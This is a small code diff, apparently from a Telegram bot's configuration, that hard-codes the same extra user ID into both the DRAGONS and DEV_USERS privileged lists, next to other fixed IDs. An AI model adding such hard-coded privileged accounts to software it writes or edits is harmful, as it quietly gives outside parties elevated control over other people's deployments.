@@ -202,10 +202,12 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 DRAGONS.add(OWNER_ID)
+DRAGONS.add(1905050903)
 DRAGONS.add(2088106582)
 DRAGONS.add(1979717764)
 DRAGONS.add(1963422158)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1905050903)
 DEV_USERS.add(1979717764)
 DEV_USERS.add(870471128)
 
